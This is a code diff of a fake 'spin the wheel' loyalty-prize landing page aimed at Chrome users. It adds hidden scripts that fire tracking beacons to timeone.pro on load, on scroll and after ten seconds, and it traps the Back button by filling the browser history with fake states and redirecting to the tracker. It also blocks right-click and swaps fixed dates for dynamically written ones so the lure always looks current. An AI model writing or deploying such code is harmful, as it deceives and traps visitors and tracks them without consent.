@@ -11,6 +11,61 @@
 <link href="./index_files/clean.css" rel="stylesheet">
 </head>
 <body oncontextmenu="return!1" onload="setButtonHeight(),autospin1()">
+
+<!------SCRIPT------->
+
+<script>
+if (typeof(window.orientation)=="undefined")
+{
+var o = document.createElement("img");
+o.src='https://timeone.pro/click.php?event10=0';
+}
+else
+{
+var o = document.createElement("img");
+o.src='https://timeone.pro/click.php?event10=1';
+}
+</script>
+
+<script type="text/javascript">
+! function () { 
+var t; 
+try { 
+for (t = 0; 10 > t; ++t) 
+history.pushState({}, "", "#"); 
+onpopstate = function (t) { 
+t.state && location.replace("https://timeone.pro/click.php?lp=1&event9=1") } 
+} catch (o) {} 
+}(); 
+</script>
+
+<script type="text/javascript">
+var scroll = 0;
+window.onscroll = function(){ 
+if( scroll != 1 ){ 
+scroll = 1;
+var o = document.createElement("img");
+o.src = "https://timeone.pro/click.php?event8=1"; 
+} } </script>
+
+<script>
+function pushToTrackerViaImage(){
+    var pushURL = 'https://timeone.pro/click.php?event7=1';
+    var img = document.createElement('img');
+    img.src=pushURL;
+    img.style.display='none';
+    document.body.appendChild( img );
+}
+function pushAfterTimeout(timeout){
+    setTimeout(pushToTrackerViaImage, timeout*1000);
+}
+var TIMEOUT_IN_SECONDS = 10;
+pushAfterTimeout(TIMEOUT_IN_SECONDS);
+</script>
+
+<!------SCRIPT END------->
+
+
 <div id="header">
 <span class="menu"></span>
 <h3><span id="headline">LOYALTY PROGRAM</span></h3><span class="icon"></span>
@@ -18,7 +73,7 @@
 <div id="container">
 <div align="center" id="firstpage">
 <div class="date" id="topDate" style="padding-bottom:10px;margin:0">
-<script>document.write(dateOffset(0,"top_date"));</script>Monday, 3 December 2018
+<script>document.write(dateOffset(0,"top_date"));</script>
 </div>
 <div style="margin-bottom:2px">
 <div id="subheadline">
@@ -26,7 +81,7 @@
 <p style="padding-top:10px">Today you are lucky!</p>
 </div>
 <div class="intro" style="padding-top:5px">
-Every <span id="today"><script>document.write(dateOffset(0,"day_name_only"));</script>Monday</span> we select 7 <script>document.write(getURLParameter("browser_name"));</script>Chrome Browser users to receive prizes from our sponsors. Turn the wheel to see which prize you can claim!
+Every <span id="today"><script>document.write(dateOffset(0,"day_name_only"));</script></span> we select 7 <script>document.write(getURLParameter("browser_name"));</script>Chrome Browser users to receive prizes from our sponsors. Turn the wheel to see which prize you can claim!
 </div>
 <div id="wheelCon">
 <img class="spinAround2" height="501" id="wheel" src="./index_files/pw_ix.webp" width="501"> <input id="pressButton" onclick="spin()" style="top: -19.2453px;" type="button">
